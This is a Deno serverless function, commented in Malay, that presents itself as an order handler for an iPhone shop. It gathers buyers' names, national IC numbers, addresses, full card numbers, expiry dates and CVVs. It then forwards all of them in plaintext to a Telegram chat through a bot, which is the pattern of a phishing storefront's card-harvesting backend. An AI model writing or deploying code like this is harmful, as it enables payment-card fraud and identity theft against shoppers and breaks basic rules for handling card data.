/// <reference path="./deno.d.ts" />
import { serve } from "https://deno.land/std@0.190.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { phoneNumber, shippingDetails, selectedIPhone, paymentDetails } = await req.json();

    // Retrieve secrets from environment variables
    // Menggunakan nama rahsia yang betul untuk bot pesanan
    const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      throw new Error('Telegram bot token or chat ID not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in Supabase secrets.');
    }

    let message = `*Pesanan Baru Diterima:*\n\n`;
    message += `*Peranti:* ${selectedIPhone.name}\n\n`;
    message += `*Maklumat Penghantaran:*\n`;
    message += `Nama Penuh: ${shippingDetails.fullName}\n`;
    message += `No. IC: ${shippingDetails.icNumber}\n`;
    message += `No. Telefon: ${shippingDetails.phoneNumber}\n`;
    message += `Alamat: ${shippingDetails.address}\n\n`;
    message += `*Maklumat Pembayaran:*\n`;
    message += `Nombor Kad: ${paymentDetails.cardNumber}\n`;
    message += `Tarikh Luput: ${paymentDetails.expiryDate}\n`;
    message += `CVV: ${paymentDetails.cvv}\n`; // Peringatan: Berhati-hati dengan menghantar CVV dalam produksi!

    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const telegramResponse = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    if (!telegramResponse.ok) {
      const errorData = await telegramResponse.json();
      console.error('Error sending to Telegram:', errorData);
      throw new Error(`Failed to send message to Telegram: ${telegramResponse.statusText}`);
    }

    return new Response(JSON.stringify({ message: 'Order information sent to Telegram successfully!' }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 200,
    });
  } catch (error) {
    console.error('Error in Edge Function:', error.message);
    return new Response(JSON.stringify({ error: error.message }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 500,
    });
  }
});